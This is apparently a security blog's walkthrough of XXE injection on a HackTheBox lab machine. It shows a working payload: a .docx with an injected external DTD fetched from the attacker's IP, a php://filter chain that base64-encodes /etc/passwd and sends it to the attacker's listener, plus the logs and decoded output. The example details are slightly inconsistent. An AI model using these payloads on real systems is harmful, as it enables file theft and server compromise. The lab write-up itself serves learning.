---
layout: single
title: "XXE injection with local DTD file and PHP filter."
excerpt: "A short brief explaination + walkthrough for XXE injection attack and how it works."
date: 2020-06-07
toc: true
toc_sticky: true
header:
  teaser: /assets/images/xxe-injection/xxe.png
  teaser_home_page: true
categories:
  - bug-hunting
tags:
  - web-app
  - xxe
  - file-read
---

In this short article I'm going to make a short explaination of the XXE injection, how it works and how it can be used into any vulnerable app to retrieve files from the remote server using a local DTD file.

First lets take a look from an usual dummy paragraph of what a XXE injection is...

## What is a XML external entity (XXE) injection? 
XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any backend or external systems that the application itself can access.

In some situations, an attacker can escalate an XXE attack to compromise the underlying server or other backend infrastructure, by leveraging the XXE vulnerability to perform server-side request forgery (SSRF) attacks.

## What are some types of a XXE attack?

There are various types of XXE attacks:

- Exploiting XXE to retrieve files, where an external entity is defined containing the contents of a file, and returned in the application's response.
- Exploiting XXE to perform SSRF attacks, where an external entity is defined based on a URL to a back-end system.
- Exploiting blind XXE exfiltrate data out-of-band, where sensitive data is transmitted from the application server to a system that the   attacker controls.
- Exploiting blind XXE to retrieve data via error messages, where the attacker can trigger a parsing error message containing sensitive   data.

## Retrieve Files through XXE

Lately I came through an interesting machine in HackTheBox (Patents) which represented a simple website with an upload form where I could upload docx files to the web server.

My first thought when I saw I could upload ``.docx`` files was that I could possibly inject macro code or usual injections to have a possible ``Remote Command Execution`` to the server but as expected it wasn't meant to be that easy, so I started to dig in more in Google to find new possibilities of injection attacks through ``.docx`` files.

While searching I came accross [PortSwigger](https://portswigger.net/web-security/xxe) which helped me the most to understand the basics of a XXE attack , how it works and how its done...  

Later I could use [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection) to test some payloads in the remote server and see if it could work.

## Exploitation 
First I went to [Google Docs](https://docs.google.com/) to create a ``.docx`` and download it to my machine to make further edits to it and inject some XML code.

![docs](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/xxe-injection/xxe1.PNG)

After it is downloaded I can unzip the document and make edits to the xml file:

```console
root@kali:~# unzip exploit.docx
inflating: word/numbering.xml
inflating: word/_rels/fontTable.xml.rels
inflating: _rels/.rels
inflating: [Content_Types].xml
inflating: DS_Store
inflating: docProps/app.xml
inflating: docProps/core.xml
[...]
```

We see a bunch of xml files that together make the `docx` file functionable.  

From here we can create a folder named `CustomXML` and put our malicious xml files inside ``item1.xml`` , ``item2.xml`` and so on.

So first I created the folder and used a payload from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-oob-with-dtd-and-php-filter) and injected it into the ``item1.xml`` with the following content :

```xml
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://10.10.x.x/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>
```

where ``10.10.x.x`` is our ip.

We can easily tell from the code that the ``item1.xml`` will try to call ``dtd.xml`` from our server and then do the attack through it.  

So I also made a copy of ``dtd.xml`` in my machine with the following content and saved it to my machine : 

```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
```

Next thing , I am going to zip back the `.docx` document with the new ``CustomXML`` folder in it , host the ``dtd.xml`` file using python web server and see how it goes.

```console
root@kali:~# zip -u exploit.docx customXml/item1.xml
```

Hosting the DTD file using :

```console
root@kali:~# python3 -m http.server 80
```

We are going to upload through the web app and see if we will get the results in the generated PDF file :

![upload](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/xxe-injection/xxe2.png)

After the file being uploaded we can quickly notice a call to our web server that lets us know that the ``item1.xml`` we injected is calling our ``dtd.xml`` from the host and try to inject the code. 

```console
root@kali:~# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.173 - - [16/May/2020 14:02:25] "GET /dtd.xml HTTP/1.0" 200 -
10.10.10.173 - - [16/May/2020 14:02:26] "GET /dtd.xml?PD9waHAKIyBuZWVkZWQgYnkgY29udmVydC5waHAKJHVwbG9hZGlyID0gJ2xldHNnby8nOwoKIyBuZWVkZWQgYnkgZ2V0UGF0ZW50LnBocAojIGdieW9sbzogSSBtb3ZlZCBnZXRQYXRlbnQucGhwIHRvIGdldFBhdGVudF9hbHBoYXYxLjAucGhwIGJlY2F1c2UgaXQncyB2dWxuZXJhYmxlCmRlZmluZSgnUEFURU5UU19ESVInLCAnL3BhdGVudHMvJyk7Cj8+Cgo= HTTP/1.0" 200 -
```

We can also notice a base64 string response to our server , but since we used a php wrapper with base64 to encode the results we can try to decode it to get the results:

```console
root@kali:~# echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpnYnlvbG86eDoxMDAwOjEwMDA6Oi9ob21lL2dieW9sbzovYmluL2Jhc2gK" | base64 -d

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
[...]
gbyolo:x:1000:1000::/home/gbyolo:/bin/bash
```

aand... as we see we were able to read ``/etc/passwd`` from the remote machine which means our attack was succesful and this way we can read any file in the remote machine like : ssh keys or possible config files to help us identify and gather more information of the machine for further exploitation.

I learned a new kind of attack while completing this machine and I hope this article helps you somehow learn something new.  
Any feedback or suggestion is appreciated!  




Do you like my work?  


